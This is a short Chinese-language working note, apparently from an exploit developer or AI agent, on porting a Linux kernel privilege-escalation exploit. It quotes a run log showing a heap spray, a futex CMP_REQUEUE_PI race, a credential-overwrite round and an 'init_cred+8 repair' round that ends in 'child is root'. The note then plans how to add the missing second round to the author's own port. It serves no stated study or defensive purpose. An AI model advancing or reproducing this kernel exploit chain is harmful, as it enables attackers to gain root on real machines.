# 43499 · 归档指出我缺的一步：**W2b `init_cred+8` repair**（round 112）

## 归档原文（退役真机 ✓）

```
[T+17297ms] heap spray done
[route] creating waiter/owner/consumer ; consumer thread running on cpu=1
[route] waiter parked; owner started
[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
multicast route status=0 clean=1/1 step=0 errno=0          ← 第一轮 = W2（凭据写）
[W2b] firing prebuilt init_cred+8 repair                  ← ★ 第二轮：init_cred+8 修复
[route] …（同样的三轮日志）；multicast route status=0 …    ← 第二轮成功
child uid = 0                                             ← ★ 两轮之后 root 到手
child is root! ✓
```

## 我缺的是什么

- 我的移植只做 **一轮**（W2 ✓：`mode=Credential`、`leaf=0`、`target = child_task + cred_off` ✓）
  且一切与归档同形 ✓（`CMP_REQUEUE_PI ret=-1 errno=35` ✓、`status=0 clean=1/1 step=0` ✓）；
- 归档在 W2 之后**还有 W2b**：`firing prebuilt init_cred+8 repair` ✓ —— 用**同一套 route**再打一轮，
  目标是 **`init_cred+8`**（不是受害者的 cred ✗），随后 `child uid = 0` ✓；
- ⇒ 也就是说：**凭据写是两轮**（写 + 修）—— 这解释了为什么我这边"写"总是不见效：链路少了一轮 ✓。

## 下一步（按归档原样补 W2b）

1. 窗口的第二步（w2 ✓）之后再打一轮：`target = init_cred 的别名 + 8` ✓、`mode`/`leaf` 按归档（W2b 的细节
   归档只给了名字 ✓ ⇒ 按 `W2` 的 `mode=2 leaf=0` 起步 ✓，需要时再调 ✓）；
2. 页面的**元组**按同一公式重算（`left = init_cred_alias + 8` ✓）⇒ 页面要重建/重发 ✓；
3. 判据：`main: victim uid=0` ✓（主语仍是受害者自报 ✓）。
